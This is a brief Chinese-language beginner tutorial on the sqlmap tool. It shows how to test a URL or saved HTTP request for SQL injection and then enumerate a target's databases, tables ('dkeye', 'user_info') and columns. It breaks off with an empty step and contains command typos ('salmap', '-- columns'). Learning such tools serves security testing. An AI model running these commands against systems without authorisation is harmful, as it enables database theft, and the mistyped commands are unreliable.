## sqlmap
### sqlmap入门
1. 判断是否存在注入点
```
sqlmap -u http://xxx
```
当参数有多个时，需要加双引号
```
sqlmap -u "http://xxx/?id=1&uid=2"
```
2. 判断http报文中是否存在注入点
将http报文写入一个文本，然后使用
```
salmap -r txt文本
```

存在注入点后，进行下一步操作
1. 查询当前用户下的所有数据库
```
sqlmap -u http://xxx/ --dbs
```
2. 确认数据库后，进行表的查询.  
比如上面一条语句确认有以下几个数据库
<img src="../pictures/j4ddnt2dp1.png" width="600" />
那么现在查询dkeye数据库中有哪些表  

```
sqlmap -u http://xxx/ -D dkeye --tables
```
3. 确认表后，获取字段名
比如上面查询表名后，确定查询其中的user_info表
<img src="../pictures/j79q4i3bahf.png" width="200" />
使用---columns获取该数据表中的字段名。

```
sqlmap -u http://xxx/ -D dkeye -T user_info -- columns
```

4. 确定字段后，使用命令获取某个字段的

```{.python .input}

```
